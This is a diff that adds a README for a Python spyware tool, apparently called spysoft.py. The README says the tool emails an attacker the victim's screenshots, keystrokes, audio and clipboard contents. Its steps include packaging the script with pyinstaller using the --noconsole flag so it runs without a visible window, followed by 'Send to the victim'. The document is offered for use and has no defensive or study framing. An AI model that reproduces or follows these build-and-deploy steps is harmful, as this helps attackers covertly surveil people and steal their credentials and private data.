@@ -1,0 +1,15 @@
+This is an spy software in python. This will send attacker email of screenshot , keylog , audio and clipboard information.
+
+
+---------------------------------------------------------------------------------------------------------------
+
+Steps :
+1. Open the program and type email with password from u will receive mail
+2. Write the email on which mail will be send.
+3. Open cmd in windows at smame location
+4. Type pyinstaller --onefile --noconsole spysoft.py
+5. Send to the victim
+
+---------------------------------------------------------------------------------------------------------------
+
+ONLY PYTHON NEEDED 
